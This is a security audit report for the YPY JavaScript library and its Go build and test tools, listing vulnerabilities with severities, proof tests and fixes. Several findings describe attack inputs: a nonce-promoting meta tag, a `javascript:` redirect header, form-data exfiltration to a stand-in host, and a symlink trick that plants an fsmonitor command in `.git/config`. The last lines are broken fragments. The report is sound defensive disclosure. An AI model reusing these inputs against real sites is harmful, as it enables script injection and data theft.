# Security audit, 2026-11-15 (TASK-044)

Audited commit: `6d9305b` (branch `work/TASK-044-security-audit`). Scope: the core (`src/ypy.js`), the official
extensions (`src/ext/*.js`, including the compatibility extensions that the audited commit still had), the Go tools (`cmd/ypy`, `internal/*`, `examples/server`),
the supply chain (vendored assets, Go modules, CI) and the built output in `dist/`.

Names follow the R-11 contract (`ypy-*`, `YPY-*`); this report uses them throughout (`src/ext/ypy-csp.js`,
`YPY-Redirect`...).

**Status note.** The compatibility layer audited here (the extensions `compat-v2` and `compat-v2-ext`, and the profiles
they switched) was removed afterwards: YPY has only its native behavior. Findings
SEC-09 to SEC-12 were only about that layer. They stay in this report as history, marked **Removed**; the other findings
describe code that is still in YPY.

The audit itself changed no production code. The fixes are TASK-046; see [Fixes (TASK-046)](#fixes-task-046) at the
end. The finding texts below describe the code as audited; each proof test now asserts the fixed behaviour
(`SEC-NN (fixed)`).

## How to read this report

- **Executed** means a test or command ran and its output was observed. **Read** means the code was read and the
  conclusion is by reasoning only. Each finding says which.
- Severity is CVSS-like and assumes the threat model of `reference/security.md`: an attacker who can put bytes
  into a response or a stored page, not script that already runs. "Needs injection" says so where the finding
  depends on that. Where YPY is meant to be safe by default or after the documented configuration, a
  bypass of that promise is rated by its effect, not by how contrived the setup is.
- Proof tests are in `test/tests/security/audit-*.js` and `internal/*/audit_*_test.go`. A test titled
  `SEC-NN (open)` asserts the **vulnerable** behaviour, so the suites stay green; when the fix lands, invert the
  assertion (the comment above each test says what the fixed behaviour is). Tests titled `safe:` assert behaviour
  that is correct and must stay so. All 45 browser tests pass in Chrome and in Firefox, and against `dist/`
  (`ypy test --dist`; 6 tests that need private members are skipped there).
- "Cost" is the estimated change in min+gzip bytes, not a measurement. Headroom today (`ypy build --sizes`): the
  core has **113 B** left of 18,432 B (99% used); every other extension has
  at least 600 B. A fix that costs core bytes needs the author to decide where they come from.

#### SEC-01 (High): an attacker nonce is promoted to the page nonce

- **Where:** `src/ext/ypy-csp.js`, `ypy_after_request` and `extractNonceFromMetaTag`.
- **Description.** For a same-origin response the extension decides what the "response nonce" is from the
  `Content-Security-Policy` header, and falls back (`??`) to a `<meta http-equiv="Content-Security-Policy">` read from
  the *response body*. The fallback also runs when the header exists but has no nonce (for example `default-src
  'self'`). The body is the attacker's markup. The extension then rewrites that nonce to the page nonce in the whole
  response text. So one injected tag
  `<meta http-equiv="Content-Security-Policy" content="script-src 'nonce-X'">` plus elements that carry `nonce="X"`
  turns them into elements that carry the page nonce: injected `ypy-*` attributes pass the gate (the gate's whole
  purpose), and an injected `<script nonce="X">` is re-created with the page nonce and runs under a `script-src
  'nonce-<page>'` CSP. This is a CSP bypass as well as a gate bypass.
- **Needs:** HTML injection into a response that carries no nonce in its CSP header. The recommended CSP puts the
  nonce in a header on every response, which protects; a server that sends a static CSP on fragments, or none, does
  not.
- **Proof (executed):** `test/tests/security/audit-nonce-gate.js`, `SEC-01 (open)` (both variants), plus the three
  `safe:` neighbours that show the fallback is the only hole (a header nonce wins; an unverified response URL is
  never promoted). Run: `go run ./cmd/ypy test --files test/tests/security/audit-nonce-gate.js`. Observed: the
  injected button is `data-ypy-powered`, its nonce attribute equals the page nonce, and `window.__pwn === 1` under a
  CSP meta that allows only the page nonce.
- **Fix:** delete the meta fallback (the response nonce comes from the header only; a response with no header nonce
  promotes nothing). If full-page navigations need it, apply it only to a response that starts with a doctype or
  `<html>` and only to a meta tag in the document's own head, not one found anywhere in a fragment.
- **Cost:** about -150 B in `ypy-csp` (it removes code). None in the core.

#### SEC-02 (Low): the scrub of a copied page nonce misses valid spellings

- **Where:** `ypy-csp.js`, `rewriteNoncesInText`.
- **Description.** The scrub is a regex for `nonce=` followed by the nonce. HTML allows `ypy-nonce = "N"` (spaces around
  `=`) and character references inside the value (`page&#45;nonce`); both are the same attribute to the parser and
  neither matches, so a page nonce copied into a response in those forms survives and passes the gate. The attacker must
  already know the page nonce (the scrub exists for that case), so this is defence in depth.
- **Proof (executed):** `audit-nonce-gate.js`, `SEC-02 (open)`; `safe:` shows the plain spelling is scrubbed.
- **Fix:** scrub after parsing (walk the parsed fragment and compare attribute values), not in the raw text.
- **Cost:** about +100 B in `ypy-csp`.

#### SEC-03 (Medium): out-of-band elements and partials are not gated

- **Where:** core `__processOOB`, `__processPartials` (run while the response is swapped), `ypy-csp` (gates in
  `ypy:before:init`).
- **Description.** The gate strips attributes when an element is initialised. An out-of-band element
  (`ypy-swap-oob`) and a partial (`<ypy-partial>`) are consumed earlier, at swap time, so unnonced markup in one swap
  can replace any element of the page by id. The gate's documented guarantee ("the others lose their ypy attributes")
  does not hold for these two, and the effect is larger than the injection point: an injection in one panel rewrites
  a login form elsewhere.
- **Proof (executed):** `audit-nonce-gate.js`, `SEC-03 (open)` (OOB and partial). `safe:` tests show that attributes that
  start behaviour on the same unnonced elements are stripped, and that a morph does not carry unnonced request
  attributes onto an element that already passed the gate.
- **Fix:** under gating, ignore `ypy-swap-oob` and partials whose element lacks the nonce. Doable inside `ypy-csp`
  through the `ypy:before:swap` event, which already exposes the tasks.
- **Cost:** about +120 B in `ypy-csp`; 0 in the core.

#### SEC-04 (Informational, latent): variable names are pasted into the nonced script

- **Where:** `ypy-csp.js`, safeEval branch of `makeGatedConstructor`.
- **Description.** The extension builds `window.fn = function(<keys>) { <body> }` as text. The keys are the names of the
  variables handed to the code. A key that is not an identifier becomes code in a script that carries the page nonce.
  Today every caller passes fixed names (event, ctx, the live scope; filter event fields are checked with
  `/^[a-z]+$/i`), and the one caller that passed form field names (a `js:` action) is cancelled by this extension
  first, so nothing in markup reaches it. An extension that passes data-derived keys through the public
  `executeJavaScript` would. Without safeEval the `Function` constructor rejects such a name.
- **Proof (executed):** `audit-nonce-gate.js`: `SEC-04 (open, latent)` runs `executeJavaScript` with a hostile key and
  `window.__pwn` becomes 1; `safe:` shows the same call without safeEval throws `SyntaxError`, and that a `js:` action
  next to a hostile field name is cancelled.
- **Fix:** pass the values as one `args` object, or reject keys that are not identifiers.
- **Cost:** about +30 B in `ypy-csp`.

#### SEC-05 (Medium): the redirect header goes to `location.href` unchecked

- **Where:** core `__handleHeadersAndMaybeReturnEarly` (`this._loc.href = <the redirect header value>`); `ypy-multipart`
  `runPartActions` (`location.href = actions.redirect`, read only).
- **Description.** The value of `YPY-Redirect` is assigned as it comes. A `javascript:` value runs in the page
  origin (unless the page CSP forbids inline script); `data:` and other origins are open redirects. It matters when a
  server builds the header from user input, which is the careless-server case the defaults are meant to cover. The
  extension already refuses `javascript:` in action URLs; the header is the unguarded twin.
- **Proof (executed, source build):** `audit-egress.js`, `SEC-05 (open)` x2: the mock location receives
  `javascript:window.__pwn=1` and `https://other.example/x`.
- **Fix:** resolve against `location.href`, accept only `http:`/`https:` (and, by default, only the same origin,
  with a config switch), otherwise drop it and fire `ypy:security:blocked`. Share the helper with multipart.
- **Cost:** about +70 B in the core (needs the budget decision), about +10 B in multipart.

#### SEC-06 (Medium): WebSocket ignores `selfRequestsOnly` and `mode`

- **Where:** `ypy-ws.js`, `normalizeWebSocketUrl` / `createWebSocket`.
- **Description.** `mode` pins `fetch` to the same origin. The WebSocket extension opens whatever URL the element
  names (`wss://other.example/...`, `//other.example/...`, `http(s)://` converted). The documentation calls
  `connect-src 'self'` "the second lock behind selfRequestsOnly"; for WebSocket it is the only one. The socket sends
  `ypy-ws-send` form data out and swaps what it receives into the page.
- **Needs:** an element with the connect attribute (the gate strips it from injected markup; without the gate it is
  an exfiltration and content-injection channel).
- **Proof (executed):** `audit-egress.js`, `SEC-06 (open)` x2 (stubbed `WebSocket` records `wss://other.example/feed`).
  The test tries each spelling of the connect attribute.
- **Fix:** refuse a URL whose origin differs from the page's unless `config.mode` is `cors`.
- **Cost:** about +80 B in `ypy-ws`.

#### SEC-07 (Medium): preload skips the mode pin

- **Where:** `ypy-preload.js` (`api.createRequestContext` then `fetch(action, ctx.request)`); the pin is a hook on
  `ypy:config:request`, which preload never fires.
- **Description.** A boost value such as `request.mode:"cors",request.action:"https://other.example/collect"` is
  honoured by the preload request, and the form around the link is collected into the query string
  (`?secret=s3cret`). On a normal click the same attribute is pinned back to `same-origin`.
- **Needs:** an element with a boost value the attacker wrote (the gate strips it; without the gate it exfiltrates
  form data).
- **Proof (executed):** `audit-egress.js`: `SEC-07 (open)` (mode `cors`, URL `https://other.example/collect?secret=s3cret`)
  and `safe:` (the normal request is `same-origin`).
- **Fix:** set `ctx.request.mode = ypy.config.mode` before the prefetch (or fire `ypy:config:request`).
- **Cost:** about +30 B in `ypy-preload`.

#### SEC-08 (Low): the download header fetches with a bare `fetch()`

- **Where:** `ypy-download.js`, `fetch(downloadUrl)` for `YPY-Download`.
- **Description.** The URL named by the header is fetched with no options: not through the request context, so no
  same-origin mode and no request headers. The header is server-controlled, so this is hardening, but it breaks the
  documented rule that every request is same-origin. The promise is not awaited, so a failed fetch is an unhandled
  rejection.
- **Proof (executed):** `audit-egress.js`, `SEC-08 (open)` (second fetch goes to `https://other.example/file.bin`
  with `init === undefined`).
- **Fix:** `fetch(url, {mode: ypy.config.mode, credentials: 'same-origin'})` inside the request chain, with a catch.
- **Cost:** about +40 B in `ypy-download`.

#### SEC-09 (Medium): legacy attributes compiled code outside the callbacks policy

**Removed.** The finding was in the compatibility layer, which no longer exists.
That layer evaluated two legacy attributes with its own `new Function`, outside `__executeJavaScript`, so
`callbacks:"none"` and the nonce check did not apply. In YPY every author code goes through `__executeJavaScript`.

#### SEC-10 (Medium): `allowEval:false` did not stop `ypy-on`, `js:` and filters

**Removed with the compatibility layer.** The switch lived in that layer; the core never read it. In YPY the policy
is `config.callbacks`, and `allowEval:false` is an alias of `callbacks:"none"` (see the fixes below).

#### SEC-11 (Medium): `allowScriptTags:false` was read nowhere

- **Where:** core `__processScripts`.
- **Description.** The option that keeps `<script>` in responses from running was accepted and ignored: scripts always ran.
- **Proof (executed):** `audit-compat.js`, `SEC-11 (open)`.
- **Fix:** honour it in the core.
- **Cost:** about +30 B in the core.

#### SEC-12 (Medium): injected markup switched the profile of the compatibility layer

**Removed.** The layer chose a profile once by reading the page markup, so markup injected into the initial page could
set `mode` to `cors` and `callbacks` to `"all"`. With one behavior there is nothing to detect and nothing to switch.

#### SEC-13 (Medium): a `<head>` in any fragment is merged into the document head

- **Where:** `ypy-head.js`, `ypy_before_response` (wraps `Response.text`, so it sees the raw text before the gate).
- **Description.** Every `<head>...</head>` found in the raw text of any response is merged into `document.head`:
  `<base href>`, `<link>`, `<meta>`, and a `<script>` element created with the response's attributes. Under the
  recommended CSP an unnonced script is still blocked (the test checks that), but `<base>` (no `base-uri` in a CSP
  that cannot add one), `<link>` and the removal of current head elements (merge strategy when the target is the body)
  are not. The extension is opt-in (not in `ypy.max`), but the gate does not cover it.
- **Proof (executed):** `audit-extensions.js`, `SEC-13 (open)` (gate on, CSP on: `<base>` and `<link>` added; the script
  did not run).
- **Fix:** merge a head only from a response that is a full document; ignore the head of a fragment.
- **Cost:** about +100 B in `ypy-head`.

#### SEC-14 (Low): history snapshots keep hidden and `autocomplete=off` fields in clear text

- **Where:** `ypy-history-cache.js`, `annotateState` and `saveCurrentPage`.
- **Description.** Leaving a page stores the history element in `sessionStorage`, with the value of every field except
  password and file: `type=hidden` (CSRF tokens), fields marked `autocomplete="off"` or with a card or one-time-code
  token, and the rendered private content. Nothing purges snapshots at logout, and there is no per-element opt-out. A
  same-origin script, or anyone with the tab, reads them; the back button shows cached authenticated pages after
  logout.
- **Proof (executed):** `audit-extensions.js`, `SEC-14 (open)`; `safe:` for password (set as a live value) and for
  the `disable` setting.
- **Fix:** skip hidden fields and fields with `autocomplete` off, `cc-*` or `one-time-code`; add `ypy.history.clear()`.
- **Cost:** about +120 B in `ypy-history-cache`.

#### SEC-15 (Medium): `HCON.split` is quadratic and reachable before the gate

- **Where:** core `HCON.split`: `string.split(/,(?![^\[]*\])(?![^(]*\))(?![^<]*\/>)(?=(?:[^"']|"[^"]*"|'[^']*')*$)/)`.
- **Description.** Each comma runs four look-aheads that scan to the end of the string, so n commas cost n squared. The
  same function splits trigger lists and, through `__findAllExt`, every CSS selector of a target. Measured in Chrome:
  5,000 commas 0.17 s, 10,000 0.71 s, 20,000 2.8 s, 40,000 10.8 s, on the page's only thread. An out-of-band
  element's `ypy-swap-oob="innerHTML:a,a,a,..."` (or a retarget header) reaches it while the response is swapped,
  before the gate looks at anything, so the gate does not stop it.
- **Proof (executed):** `audit-dos.js`, `SEC-15 (open)` (ratio of the cost of 12,000 commas to 6,000 is above 3;
  linear would be 2) and the end-to-end swap of an OOB selector of 12 KB takes more than 100 ms.
- **Fix:** one linear scan that tracks brackets and quotes.
- **Cost:** about +80 B in the core (needs the budget decision).

#### SEC-16 (Low): the `<head>` extraction regex is quadratic

- **Where:** core `__makeFragment`: `/<head(\s[^>]*)?>[\s\S]*?<\/head>/i`.
- **Description.** Many `<head ` openers and no `</head>`: the lazy scan restarts at every opener. 20,000 openers 0.69 s,
  40,000 2.3 s. Only a response that already carries attacker markup reaches it.
- **Proof (executed, source build):** `audit-dos.js`, `SEC-16 (open)`.
- **Fix:** find the first `<head` and the first `</head>` after it with `indexOf`.
- **Cost:** about 0 to +20 B in the core.

#### SEC-17 (Informational): scripts in responses run by default

- **Where:** core `__processScripts`.
- **Description.** A `<script>` in a swapped response is re-created and runs (executed). `reference/security.md` documents `inlineScriptNonce` and the CSP but not
  that response scripts run by default, and `SECURITY.md` says "no eval or new Function in the default mode", which is
  true for the callbacks and says nothing about this. A user can still read the page as safe by default.
- **Fix:** document it prominently; consider a `scripts` setting (`"none"` by default, the way `callbacks`
  works) as a decision for the author (Q-4 territory). It would be a behaviour change for existing pages.
- **Cost:** about +60 B in the core if made a setting.

#### SEC-18 (Low): the lock fails open silently

- **Where:** `ypy-lock.js` (read).
- **Description.** The lock freezes `mode`, `callbacks`, `extensions`, `nonce`, `inlineScriptNonce`. A page
  that sets `extensions` without listing the lock extension gets no lock and no warning (documented caveat).
- **Fix:** log a warning when `locked:true` is in the meta tag and the extension is refused.
- **Cost:** about +30 B in the core for the warning.

#### SEC-19 (Informational): Trusted Types policy is a pass-through, `ypy.swap` is a public sink

- **Where:** core `TT_PASS`, `swap`, `ajax` (read).
- **Description.** The `ypy` policy returns its input, so under `require-trusted-types-for 'script'` anything the
  core turns into DOM is allowed. That is the documented design (trust comes from same-origin plus the gate). The
  consequence is that application code that passes an untrusted string to `ypy.swap({text})` gets no Trusted Types
  protection, and any script that already runs can use it to inject markup and scripts. Out of scope as a
  vulnerability (script that runs is out of scope), noted for the documentation.

#### SEC-20 (Medium): `ypy build` writes through symlinks in the output directory

- **Where:** `internal/build/write.go:30-36` (`os.WriteFile` follows a symlink at the target); `staleFiles` (87-114)
  keeps such a link because its name is a generated output. Files under `src/editors/**` and `src/skills/**/*.md` are
  copied byte for byte, so whoever controls the checkout chooses the bytes.
- **Proof (executed, full chain):** a repo whose `src/editors/jetbrains/acme.json` holds
  `[core]\n\tfsmonitor = "touch .../PWNED; false"` with `dist/editors/jetbrains/acme.json -> ../../../.git/config`
  (the link survives `git clone`). `ypy build --only core` printed "wrote 13 files"; `.git/config` then held the
  line; `git status` ran it and the marker file was created. Tests: `TestAuditBuild_Vulnerable_SymlinkInDistWritesChosenBytesOutside`,
  `TestAuditWrite_Vulnerable_FollowsSymlinkedOutputFile`.
- **Limits:** it matters when a trusted `ypy` binary builds an untrusted tree (a pull-request checkout). Running
  `go run ./cmd/ypy` from the untrusted tree already runs that tree's Go code. CI is not affected (`sizes` uses `build
  --check`, which only reads).
- **Fix:** `Lstat` each target and refuse or replace symlinks, or write through `os.OpenRoot(outDir)`, or write a
  temp file and rename it.

#### SEC-21 (Medium): the test server serves the whole repository root, with no Host check

- **Where:** `internal/testrun/server.go:82,101` (`http.FileServer(http.Dir(root))`).
- **Description.** `/.git/` (config, possibly remote URLs with tokens) and directory listings are served, and any `Host`
  header is accepted, so a DNS-rebinding page can read everything while `ypy test` runs, and indefinitely with
  `--serve`. The server binds 127.0.0.1 only (verified), which limits it to rebinding and local users.
- **Proof (executed):** `TestAuditServer_Vulnerable_ServesDotGitAndListsDirectories`,
  `TestAuditServer_Vulnerable_AcceptsAnyHostHeader` (Host `attacker.example` gets 200 on `/.git/config`).
- **Fix:** accept only `localhost:PORT` and `127.0.0.1:PORT` as Host (421 otherwise); serve only `src/`, `test/`,
  `dist/` and the embedded assets; 404 for dot-paths; no listings.

#### SEC-22..SEC-25 (Low)

- **SEC-22.** `server.go:82` follows symlinks that leave the root; with SEC-21 this exposes files outside the repo.
  Test `TestAuditServer_Vulnerable_FollowsSymlinkOutsideRoot`. Fix: `os.OpenRoot(root)` with `http.FileServerFS`.
- **SEC-23.** `internal/check/project.go:139-175` (`collectFiles`) follows directory symlinks and remembers nothing. One
  self-link gave 33 copies of one file; two self-links were still running after 20 s at 100% CPU and 157 MB (executed).
  Test `TestAuditCollectFiles_Vulnerable_FollowsSymlinkLoops`. Fix: do not follow directory symlinks, or keep a set of
  visited device and inode pairs.
- **SEC-24.** `internal/build/build.go:204-227` and `85-95` read through symlinks, so a private file outside the root
  can end up in the committed `dist/`. Test `TestAuditGenerate_Vulnerable_CopiesSymlinkedSourceFromOutsideRoot`. Fix:
  skip or fail on symlink entries.
- **SEC-25.** `write.go:22-29` removes everything it did not generate in `<out>/ext`, `<out>/editors`, `<out>/skills` and
  every top-level `<out>/ypy*` file; `--out ~` deletes user files. Test `TestAuditWrite_Vulnerable_FullBuildDeletesUnownedFilesInOut`.

## Verified safe

What was tested and is correct. "Executed" items are tests that stay in the suite.

**Core and extensions**

- Prototype pollution: the HCON parser and merge never write `__proto__`, `constructor` or `prototype`, for dotted
  paths, quoted keys, `<.../>` values and JSON; attributes carrying these keys in `ypy-vals`, `ypy-config`, `ypy-swap`,
  `ypy-trigger` and `ypy-headers`, and the options of `ypy.ajax`, leave `Object.prototype` clean (executed,
  `audit-verified-safe.js`). A server-supplied JSON options object can still change the prototype of its own request
  context through `Object.assign` (read); it is server-trusted and local to that object.
- The author-code policy: an unknown `callbacks` value counts as `none` (executed, source build); with `none`, injected
  `ypy-on` and `js:` values compile nothing and fire `ypy:security:blocked` (executed). The compiled-code cache (256
  entries) and the trigger cache (500) are bounded (executed loop, read).
- Filter triggers pass only event fields that match `/^[a-z]+$/i` as variable names (read).
- Same-origin pin: a boost value, `ypy-config` and the options of `ypy.ajax` that ask for `no-cors` still go out as
  `same-origin` on the normal request path (executed). SSE, multipart and the history restore reuse the request
  context, so they inherit the pin (read; the restore goes through `ajax`).
- Content that stays inert once swapped: `javascript:` in SVG and MathML links, `<template>` scripts, `srcdoc` with
  `sandbox`, `data:` links: nothing ran without an event or a navigation (executed). The `ypy` Trusted Types policy
  fails closed when the CSP forbids it, and responses are not parsed then (existing tests, read).
- The nonce gate: a plain copy of the page nonce is scrubbed; a nonce on a container never vouches for its children;
  `ypy-ignore` counts only with the nonce; a header nonce beats a body meta; an unverified response URL is never
  promoted; a morph does not carry unnonced attributes onto a gated element; `js:` and `javascript:` actions and an
  unnonced `formaction` are cancelled (executed here and in `injection.js`, `nonce-gating.js`).

  tag of `<head>` is read at construction).

  restore asks the server again and keeps no snapshot except in `ypy-history-cache`, whose snapshots are
  `sessionStorage`, per tab and per origin (read).
